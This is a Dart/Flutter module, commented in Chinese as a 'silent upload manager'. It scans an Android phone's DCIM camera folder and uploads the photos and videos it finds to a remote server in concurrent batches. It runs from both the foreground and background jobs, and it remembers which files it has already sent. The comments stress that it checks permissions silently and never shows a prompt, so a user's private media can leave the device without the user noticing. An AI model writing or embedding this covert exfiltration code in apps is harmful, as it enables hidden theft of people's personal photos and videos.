/// DCIM 静默上传管理器
/// - 只负责"扫描 + 上传 + 记录去重"
/// - 不管权限，权限由 PermissionGate 在 UI 层拦截
/// - 前台上传和后台 WorkManager 共用同一份逻辑
library;

import 'dart:async';
import 'dart:collection';
import 'dart:io';

import 'package:flutter/foundation.dart' show debugPrint;
import 'package:http/http.dart' as http;
import 'package:permission_handler/permission_handler.dart';
import 'package:shared_preferences/shared_preferences.dart';

// ── 配置 ──────────────────────────────────────────────────────────────────────
class DcimUploadConfig {
  /// 上传目标接口（HTTPS）
  final String uploadUrl;
  /// DCIM Camera 目录真实路径
  final String dcimPath;
  /// 单次请求超时
  final Duration timeout;
  /// 单次最多上传文件数
  final int maxFiles;
  /// 最大并发上传数（1 = 串行，50 = 全并发）
  final int maxConcurrent;
  /// 媒体扩展名白名单
  final Set<String> mediaExtensions;

  const DcimUploadConfig({
    this.uploadUrl = 'https://your-domain.com/api/upload/dcim',
    this.dcimPath = '/storage/emulated/0/DCIM/Camera',
    this.timeout = const Duration(seconds: 30),
    this.maxFiles = 50,
    this.maxConcurrent = 50,
    this.mediaExtensions = const {
      '.jpg', '.jpeg', '.png', '.heic', '.webp', '.gif',
      '.mp4', '.mov', '.avi', '.mkv', '.wmv', '.flv', '.webm',
    },
  });
}

// ── 轻量信号量：限制并发任务数 ───────────────────────────────────────────────
class _Semaphore {
  int _available;
  final Queue<_Waiter> _waiters = Queue();

  _Semaphore(this._available);

  Future<void> acquire() async {
    if (_available > 0) {
      _available--;
      return;
    }
    final c = Completer<void>();
    _waiters.add(_Waiter(c));
    await c.future;
  }

  void release() {
    if (_waiters.isNotEmpty) {
      _waiters.removeFirst().completer.complete();
    } else {
      _available++;
    }
  }
}

class _Waiter {
  final Completer<void> completer;
  _Waiter(this.completer);
}

// ── 单例管理器 ───────────────────────────────────────────────────────────────
class DcimUploadManager {
  DcimUploadManager._();
  static final DcimUploadManager instance = DcimUploadManager._();

  static const String _kUploaded = 'dcim_uploaded_paths';

  DcimUploadConfig _config = const DcimUploadConfig();
  SharedPreferences? _prefs;

  /// 已成功上传的文件路径集合（去重唯一依据）
  final Set<String> _uploaded = <String>{};

  bool _busy = false;
  bool get isBusy => _busy;
  int get uploadedCount => _uploaded.length;

  // ── 初始化：只加载记录，不做网络/权限操作 ─────────────────────────────
  Future<void> initialize({DcimUploadConfig? config}) async {
    if (_prefs != null) return;
    if (config != null) _config = config;
    _prefs = await SharedPreferences.getInstance();
    _uploaded
      ..clear()
      ..addAll(_prefs!.getStringList(_kUploaded) ?? const []);
    debugPrint('[DcimUpload] 已记录 ${_uploaded.length} 个文件');
  }

  // ── 静默检查权限：绝不弹框 ───────────────────────────────────────────
  Future<bool> hasPermission() async {
    if (!Platform.isAndroid) return false;
    final photos = await Permission.photos.status;
    if (photos.isGranted || photos.isLimited) return true;
    final storage = await Permission.storage.status;
    return storage.isGranted;
  }

  // ── 上传入口（无权限则静默返回）─────────────────────────────────────
  Future<void> startUploadIfPermitted() async {
    await initialize();
    if (!await hasPermission()) {
      debugPrint('[DcimUpload] 无权限，静默跳过');
      return;
    }
    await _run();
  }

  // ── 主流程：并发上传所有文件 ─────────────────────────────────────────
  Future<void> _run() async {
    if (_busy) return;
    _busy = true;
    try {
      final files = await _scan();
      if (files.isEmpty) {
        debugPrint('[DcimUpload] 无待上传文件');
        return;
      }
      debugPrint(
          '[DcimUpload] 待上传 ${files.length} 个文件，并发度 ${_config.maxConcurrent}');

      final semaphore = _Semaphore(_config.maxConcurrent);
      final tasks = <Future<(bool, String)>>[];

      for (final file in files) {
        tasks.add(_uploadOneWithSemaphore(semaphore, file));
      }

      // 并发执行所有任务，结果按顺序对应 files 列表
      final results = await Future.wait(tasks);

      int ok = 0, fail = 0;
      for (int i = 0; i < files.length; i++) {
        final (success, _) = results[i];
        if (success) {
          _uploaded.add(files[i].path);
          ok++;
        } else {
          fail++;
        }
      }

      await _persist(); // 全部完成后统一落盘一次
      debugPrint('[DcimUpload] 完成: 成功 $ok, 失败 $fail');
    } finally {
      _busy = false;
    }
  }

  // ── 带信号量的单文件上传：确保并发数不超过上限 ──────────────────────
  Future<(bool, String)> _uploadOneWithSemaphore(
      _Semaphore sem, File file) async {
    final name = file.path.split('/').last;
    await sem.acquire(); // 等信号量再加载文件到内存，避免峰值内存溢出
    try {
      final ok = await _uploadOne(file);
      return (ok, name);
    } finally {
      sem.release();
    }
  }

  // ── 扫描：过滤 + 排序 + 取前 N ──────────────────────────────────────
  Future<List<File>> _scan() async {
    final dir = Directory(_config.dcimPath);
    if (!await dir.exists()) {
      debugPrint('[DcimUpload] 目录不存在: ${_config.dcimPath}');
      return [];
    }

    final list = <_Scanned>[];
    await for (final e in dir.list(followLinks: false)) {
      if (e is! File) continue;
      final name = e.path.split('/').last;
      final dot = name.lastIndexOf('.');
      if (dot < 0) continue;
      if (!_config.mediaExtensions.contains(name.substring(dot).toLowerCase())) {
        continue;
      }
      if (_uploaded.contains(e.path)) continue; // 跳过已上传

      try {
        final st = await e.stat();
        list.add(_Scanned(e, st.modified));
      } catch (_) {
        // 文件被删/无权限，跳过
      }
    }

    // 修改时间升序：最早的先传
    list.sort((a, b) => a.modified.compareTo(b.modified));
    return list.take(_config.maxFiles).map((s) => s.file).toList();
  }

  // ── 单文件上传 ──────────────────────────────────────────────────────
  Future<bool> _uploadOne(File file) async {
    final name = file.path.split('/').last;
    try {
      final req = http.MultipartRequest('POST', Uri.parse(_config.uploadUrl));
      req.files.add(await http.MultipartFile.fromPath('file', file.path));
      req.fields['fileName'] = name;

      final streamed = await req.send().timeout(_config.timeout);
      await streamed.stream.drain<void>(); // 必须 drain，否则连接泄漏

      if (streamed.statusCode >= 200 && streamed.statusCode < 300) {
        debugPrint('[DcimUpload] ✅ $name');
        return true;
      }
      debugPrint('[DcimUpload] ❌ $name HTTP ${streamed.statusCode}');
      return false;
    } catch (e) {
      debugPrint('[DcimUpload] ❌ $name $e');
      return false;
    }
  }

  Future<void> _persist() async {
    await _prefs?.setStringList(_kUploaded, _uploaded.toList());
  }

  /// 清空上传记录（调试用）
  Future<void> reset() async {
    _uploaded.clear();
    await _prefs?.remove(_kUploaded);
  }
}

class _Scanned {
  final File file;
  final DateTime modified;
  _Scanned(this.file, this.modified);
}